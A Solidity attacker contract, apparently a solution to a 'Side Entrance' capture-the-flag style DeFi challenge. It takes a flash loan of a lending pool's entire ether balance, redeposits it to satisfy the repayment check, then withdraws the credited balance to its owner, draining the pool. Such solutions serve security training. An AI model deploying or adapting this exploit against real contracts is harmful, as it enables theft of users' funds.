// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solmate/src/auth/Owned.sol";
import "solady/src/utils/SafeTransferLib.sol";
import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract AttackerSideEntrance is IFlashLoanEtherReceiver, Owned {
    SideEntranceLenderPool private immutable pool;

    error Wrong_Caller();

    constructor(SideEntranceLenderPool _pool) Owned(msg.sender) {
        pool = _pool;
    }

    function execute() external payable {
        if (msg.sender != address(pool)) revert Wrong_Caller();
        pool.deposit{value: address(this).balance}();
    }

    function withdraw() external onlyOwner {
        pool.withdraw();
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }

    function start() external onlyOwner {
        pool.flashLoan(address(pool).balance);
    }

    receive() external payable {}
}
